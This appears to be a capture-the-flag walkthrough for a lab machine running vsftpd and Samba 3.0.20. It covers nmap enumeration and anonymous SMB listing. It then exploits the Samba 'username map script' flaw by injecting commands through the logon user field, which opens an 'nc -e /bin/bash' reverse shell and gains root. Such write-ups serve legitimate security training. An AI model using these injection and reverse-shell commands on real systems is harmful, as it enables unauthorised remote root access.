1. Enumerate ports and version with:
nmap __{VICTIM'S IP}__ --open -sS --min-rate=5000 -p- -n -Pn -vvv __{IP}__ -oN allports
nmap __{VICTIM'S IP}__ -sCV -p __{ports}__ -oN targeted

2. Look at the results of the last command and try something with anonymous in ftp

3. Look for possible CVE in the service versions

4. Try something with vsftpd 2.3.1

5. Exploit Username Map Script in Samba 3.0.20 to gain root access to the machine
	1. Previously you could try to list the local server resources of the smbserver with the command: smbclient -L __{IP}__ -N --option 'client min protocol = NT1'
	- -L : List resources
	- -N : Use a null session (because I don't have any valid login credentials)
	- --option : Use the option client min protocol = NT1 to solve the error that appears when you try to connect with a null session to this specific server
    2. After listing you can connect to the server using: "smbclient //__{IP}__/tmp -N" in order to get server info with an anonymous login
    3. Exploting the vuln Username Map Script you can use the smb command "logon" to inject code using the following expression: "/=\`nohup __{command to exectue}__\`" as a user leading to remote command execution
    4. Try using 'logon "/=\`nohup ping -c 1 __{LOCAL-IP}__\`"' with your home machine listening for incoming icmp with the command tcpdump -i __{INTERFACE}__ icmp -n
    - -i : option to set the interface to dump (tun0 in this case)
    - -n : Doesn't apply dns resolution (similar to nmap -n)
    5. Start netcat in the local machine looking for connections: "nc -lvnp 443" and in the remote machine send a bash console: 'logon "/=\`nohup nc -e /bin/bash __{LOCAL-IP }__ 443\`"'
    6. In the local machine use "script /dev/null -c bash" to make the console look prettier
    7. Change $SHELL to /bin/bash and $TERM to xterm, also do CTRL+Z and insert "stty raw -echo; fg" to enable you to, right after that, use the command "reset xterm" to have a fully interactive console
    8. You can also see in a personal shell the size of your console with the command "stty size" and apply it to the other terminal with "stty rows __{ROWS}__ columns __{COLUMNS}__"
    9. Find the flags and submit them. You can use "find \ -name user.txt | xargs cat" and "find \ -name root.txt | xargs cat"

6. End of the Machine